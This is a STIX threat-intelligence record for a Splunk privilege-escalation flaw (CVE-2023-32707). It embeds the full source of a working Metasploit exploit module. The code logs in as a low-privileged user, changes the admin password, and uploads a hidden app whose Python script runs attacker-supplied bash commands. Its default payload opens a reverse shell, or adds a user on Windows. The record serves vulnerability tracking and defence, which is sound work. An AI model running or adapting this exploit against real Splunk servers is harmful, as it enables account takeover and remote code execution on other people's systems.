{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--17929ca3-d7a0-4bf8-8092-e7e4fdfe345d",
    "created": "2024-08-14T17:08:25.928659Z",
    "modified": "2024-08-14T17:08:25.928663Z",
    "name": "Splunk \"edit_user\" Capability Privilege Escalation",
    "description": " A low-privileged user who holds a role that has the \"edit_user\" capability assigned to it can escalate their privileges to that of the admin user by providing a specially crafted web request. This is because the \"edit_user\" capability does not honor the \"grantableRoles\" setting in the authorize.conf configuration file, which prevents this scenario from happening.  This exploit abuses this vulnerability to change the admin password and login with it to upload a malicious app achieving RCE. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/splunk_privilege_escalation_cve_2023_32707.rb",
            "external_id": "splunk_privilege_escalation_cve_2023_32707.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-32707"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/redwaysecurity/CVEs/tree/main/CVE-2023-32707#PoC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  include Msf::Exploit::Remote::HttpClient\n\n  attr_accessor :cookie\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Splunk \"edit_user\" Capability Privilege Escalation',\n        'Description' => %q{\n          A low-privileged user who holds a role that has the \"edit_user\" capability assigned to it\n          can escalate their privileges to that of the admin user by providing a specially crafted web request.\n          This is because the \"edit_user\" capability does not honor the \"grantableRoles\" setting in the authorize.conf\n          configuration file, which prevents this scenario from happening.\n\n          This exploit abuses this vulnerability to change the admin password and login with it to upload a malicious app achieving RCE.\n        },\n        'Author' => [\n          'Mr Hack (try_to_hack) Santiago Lopez', # discovery\n          'Heyder Andrade', # metasploit module\n          'Redway Security <redwaysecurity.com>' # Writeup and PoC\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2023-32707' ],\n          [ 'URL', 'https://advisory.splunk.com/advisories/SVD-2023-0602' ], # Vendor Advisory\n          [ 'URL', 'https://blog.redwaysecurity.com/2023/09/exploit-cve-2023-32707.html' ], # Writeup\n          [ 'URL', 'https://github.com/redwaysecurity/CVEs/tree/main/CVE-2023-32707' ] # PoC\n        ],\n        'Payload' => {\n          'Space' => 1024,\n          'DisableNops' => true\n        },\n        'Platform' => %w[linux unix win osx],\n        'Targets' => [\n          [\n            'Splunk < 9.0.5, 8.2.11, and 8.1.14 / Linux',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => %w[linux unix],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python',\n                # just to avoid the error because of the clean up: 'error retrieving current directory: getcwd: cannot access parent directories:'\n                'AutoRunScript' => 'post/multi/general/execute COMMAND=cd $SPLUNK_HOME'\n              }\n            }\n          ],\n          [\n            'Splunk < 9.0.5, 8.2.11, and 8.1.14 / Windows',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'win',\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/adduser' }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8000,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            IOC_IN_LOGS, # requests are logged in the _audit index\n            # ARTIFACTS_ON_DISK # app is removed in the cleanup method\n          ]\n        },\n        'DisclosureDate' => '2023-06-01'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The username with \"edit_user\" role to authenticate as']),\n        OptString.new('PASSWORD', [true, 'The password for the specified username']),\n        OptString.new('TARGET_USER', [true, 'The username to change the password for (default: admin)', 'admin']),\n        OptString.new('TARGET_PASSWORD', [false, 'The new password to set for the admin user (default: random)', Rex::Text.rand_text_alpha(rand(8..12))]),\n        OptString.new('APP_NAME', [false, 'The name of the app to upload (default: random)', Faker::App.name.downcase.gsub(/(\\s|-|_){1,}/, '')])\n      ]\n    )\n    # That depends on finding a strategy to distinguish commands that return output and commands that don't\n    # register_advanced_options(\n    #   [\n    #     OptBool.new('ReturnOutput', [ true, 'Display command output', false ])\n    #   ]\n    # )\n  end\n\n  def check\n    splunk_login(datastore['USERNAME'], datastore['PASSWORD'])\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/en-US/splunkd/__raw/services/authentication/users/', datastore['USERNAME']),\n      'method' => 'GET',\n      'cookie' => cookie,\n      'vars_get' => {\n        'output_mode' => 'json'\n      }\n    })\n\n    return CheckCode::Unknown('Could not detect the version.') unless res&.code == 200\n\n    body = res.get_json_document\n    version = Rex::Version.new(body['generator']['version'])\n\n    return CheckCode::Safe(\"Detected Splunk version #{version} which is not vulnerable\") unless (\n      (Rex::Version.new('9.0.0') <= version && version < Rex::Version.new('9.0.5')) ||\n      (Rex::Version.new('8.2.0') <= version && version < Rex::Version.new('8.2.11')) ||\n      (Rex::Version.new('8.1.0') <= version && version < Rex::Version.new('8.1.14'))\n    )\n\n    print_status(\"Detected Splunk version #{version} which is vulnerable\")\n    capabilities = body['entry'].first['content']['capabilities']\n\n    return CheckCode::Safe(\"User '#{datastore['USERNAME']}' does not have 'edit_user' capability\") unless capabilities.include? 'edit_user'\n\n    report_vuln(\n      host: rhost,\n      name: name,\n      refs: references,\n      info: [version]\n    )\n\n    CheckCode::Vulnerable(\"User '#{datastore['USERNAME']}' has 'edit_user' capability\")\n  end\n\n  def app_name\n    datastore['APP_NAME']\n  end\n\n  # The cleanup method is removing the app before the session is closed and it is broking the session.\n  #\n  def cleanup\n    return unless session_created?\n\n    super\n    # Destroy job\n    vprint_status(\"Cleaning up: destroying job #{@job_id}\")\n    send_request_cgi({\n      'uri' => normalize_uri('/en-US/splunkd/__raw/services/search/jobs/', job_id),\n      'method' => 'DELETE',\n      'cookie' => cookie\n    })\n    # Remove app\n    vprint_status(\"Cleaning up: removing app #{app_name}\")\n    execute_command(\"bash -c 'rm -rf $SPLUNK_HOME/etc/apps/#{app_name}'\")\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/en-US/debug/refresh'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'vars_post' => {\n        'splunk_form_key' => cookies_hash['splunkweb_csrf_token_8000']\n      }\n    })\n  end\n\n  def exploit\n    splunk_change_password(datastore['TARGET_USER'], datastore['TARGET_PASSWORD'])\n    splunk_login(datastore['TARGET_USER'], datastore['TARGET_PASSWORD'])\n\n    splunk_upload_app(app_name, datastore['SPLUNK_APP_FILE'])\n\n    @job_id = execute_command(payload.encoded, { app_name: app_name })\n    # TODO: distinguish commands that return output and commands that don't\n    # fail_with(Failure::ConfigError, 'The payload returns output. Consider to set ReturnOutput to true') if payload.encoded.include? 'return output' && !datastore['ReturnOutput']\n    # if datastore['ReturnOutput']\n    #   print_status('Waiting for command output')\n    #   print_line(splunk_fetch_job_output)\n    # end\n  end\n\n  def execute_command(cmd, opts = {})\n    res = send_request_cgi({\n      'uri' => '/en-US/api/search/jobs',\n      'method' => 'POST',\n      'cookie' => cookie,\n      'headers' =>\n        {\n          'X-Requested-With' => 'XMLHttpRequest',\n          'X-Splunk-Form-Key' => cookies_hash['splunkweb_csrf_token_8000']\n        },\n      'vars_post' =>\n        {\n          'auto_cancel' => '62',\n          'status_buckets' => '300',\n          'output_mode' => 'json',\n          'search' => \"|  #{app_name} #{Rex::Text.encode_base64(cmd)}\",\n          'earliest_time' => '-1@h',\n          'latest_time' => 'now',\n          'ui_dispatch_app' => (opts[:app_name]).to_s\n        }\n    })\n\n    fail_with(Failure::UnexpectedReply, \"Unable to execute command. Unexpected reply (HTTP #{res.code})\") unless res&.code == 200\n\n    body = res.get_json_document\n\n    fail_with(Failure::UnexpectedReply, 'Unable to get JOB ID of the command') unless body['data']\n\n    body['data']\n  end\n\n  def splunk_helper_extract_token(uri)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, uri),\n      'method' => 'GET',\n      'keep_cookies' => true\n    })\n\n    fail_with(Failure::Unreachable, 'Unable to get token') unless res&.code == 200\n\n    \"session_id_8000=#{rand_text_numeric(40)}; \" << res.get_cookies\n  end\n\n  def splunk_login(username, password)\n    # gets cval and splunkweb_uid cookies\n    self.cookie = splunk_helper_extract_token('/en-US/account/login')\n\n    # login post, should get back the splunkd_8000 and splunkweb_csrf_token_8000 cookies\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/en-US/account/login'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'vars_post' =>\n        {\n          'username' => username,\n          'password' => password,\n          'cval' => cookies_hash['cval']\n        }\n    })\n\n    fail_with(Failure::UnexpectedReply, 'Unable to login') unless res&.code == 200\n\n    cookie << \" #{res.get_cookies}\"\n  end\n\n  def splunk_change_password(username, password)\n    # due to the AutoCheck mixin and the keep_cookies option, the cookie might be already set\n    do_login(username, password) unless cookie\n\n    print_status(\"Changing '#{username}' password to #{password}\")\n    res = send_request_cgi({\n      'uri' => normalize_uri('/en-US/splunkd/__raw/services/authentication/users/', username),\n      'method' => 'POST',\n      'headers' => {\n        'X-Splunk-Form-Key' => cookies_hash['splunkweb_csrf_token_8000'],\n        'X-Requested-With' => 'XMLHttpRequest'\n      },\n      'cookie' => cookie,\n      'vars_post' => {\n        'output_mode' => 'json',\n        'password' => password,\n        'force-change-pass' => 0,\n        'locked-out' => 0\n      }\n    })\n\n    fail_with(Failure::UnexpectedReply, \"Unable to change #{username}'s password.\") unless res&.code == 200\n\n    print_good(\"Password of the user '#{username}' has been changed to #{password}\")\n\n    body = res.get_json_document\n    capabilities = body['entry'].first['content']['capabilities']\n\n    fail_with(Failure::BadConfig, \"The user '#{username}' does not have 'install_app' capability. You may consider to target other user\") unless capabilities.include? 'install_apps'\n  end\n\n  def splunk_upload_app(app_name, _file_name)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/en-US/manager/appinstall/_upload'),\n      'method' => 'GET',\n      'cookie' => cookie\n    })\n\n    fail_with(Failure::UnexpectedReply, 'Unable to get form state') unless res&.code == 200\n\n    html = res.get_html_document\n\n    print_status(\"Uploading file #{app_name}\")\n\n    data = Rex::MIME::Message.new\n    # fill the hidden fields from the form: state and splunk_form_key\n    html.at('[id=\"installform\"]').elements.each do |form|\n      next unless form.attributes['value']\n\n      data.add_part(form.attributes['value'].to_s, nil, nil, \"form-data; name=\\\"#{form.attributes['name']}\\\"\")\n    end\n    data.add_part('1', nil, nil, 'form-data; name=\"force\"')\n    data.add_part(splunk_app, 'application/gzip', 'binary', \"form-data; name=\\\"appfile\\\"; filename=\\\"#{app_name}.tar.gz\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi({\n      'uri' => '/en-US/manager/appinstall/_upload',\n      'method' => 'POST',\n      'cookie' => cookie,\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => post_data\n    })\n\n    fail_with(Failure::Unknown, 'Error uploading App') unless (res&.code == 303 || (res.code == 200 && res.body !~ /There was an error processing the upload/))\n\n    print_good(\"#{app_name} successfully uploaded\")\n  end\n\n  # def splunk_fetch_job_output\n  #   res = send_request_cgi({\n  #     'uri' => normalize_uri(target_uri.path, \"/en-US/splunkd/__raw/servicesNS/#{datastore['TARGET_USER']}/#{app_name}/search/jobs/#{@job_id}/results\"),\n  #     'method' => 'GET',\n  #     'keep_cookies' => true,\n  #     'cookie' => cookie,\n  #     'vars_get' => {\n  #       'output_mode' => 'json'\n  #     }\n  #   })\n\n  #   fail_with(Failure::UnexpectedReply, \"Unable to get JOB results. Unexpected reply (HTTP #{res.code})\") unless res&.code == 200\n\n  #   body = res.get_json_document\n\n  #   fail_with(Failure::UnexpectedReply, \"Splunk reply: #{body['messages'].collect { |h| h['text'] if h['type'] == 'ERROR' }.join('\\n')}\") if body['results'].empty?\n\n  #   Rex::Text.decode_base64(body['results'].first['result'])\n  # end\n\n  def splunk_app\n    # metadata folder\n    metadata = <<~EOF\n      [commands]\n      export = system\n    EOF\n\n    # default folder\n    commands_conf = <<~EOF\n      [#{app_name}]\n      type = python\n      filename = #{app_name}.py\n      local = false\n      enableheader = false\n      streaming = false\n      perf_warn_limit = 0\n    EOF\n\n    app_conf = <<~EOF\n      [launcher]\n      author=#{Faker::Name.name}\n      description=#{Faker::Lorem.sentence}\n      version=#{Faker::App.version}\n\n      [ui]\n      is_visible = false\n    EOF\n\n    # bin folder\n    msf_exec_py = <<~EOF\n      import sys, base64, subprocess\n      import splunk.Intersplunk\n\n      header = ['result']\n      results = []\n\n      try:\n        proc = subprocess.Popen(['/bin/bash', '-c', base64.b64decode(sys.argv[1]).decode()], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n        output = proc.stdout.read().decode('utf-8')\n        results.append({'result': base64.b64encode(output.encode('utf-8')).decode('utf-8')})\n      except Exception as e:\n        error_msg = f'Error : {str(e)} '\n        results = splunk.Intersplunk.generateErrorResults(error_msg)\n\n      splunk.Intersplunk.outputResults(results, fields=header)\n    EOF\n\n    tarfile = StringIO.new\n    Rex::Tar::Writer.new tarfile do |tar|\n      tar.add_file(\"#{app_name}/metadata/default.meta\", 0o644) do |io|\n        io.write metadata\n      end\n      tar.add_file(\"#{app_name}/default/commands.conf\", 0o644) do |io|\n        io.write commands_conf\n      end\n      tar.add_file(\"#{app_name}/default/app.conf\", 0o644) do |io|\n        io.write app_conf\n      end\n      tar.add_file(\"#{app_name}/bin/#{app_name}.py\", 0o644) do |io|\n        io.write msf_exec_py\n      end\n    end\n    tarfile.rewind\n    tarfile.close\n\n    Rex::Text.gzip(tarfile.string)\n  end\n\n  def cookies_hash\n    cookie.split(';').each_with_object({}) { |name, h| h[name.split('=').first.strip] = name.split('=').last.strip }\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2023-06-01",
    "x_mitre_platforms": [
        "win'"
    ]
}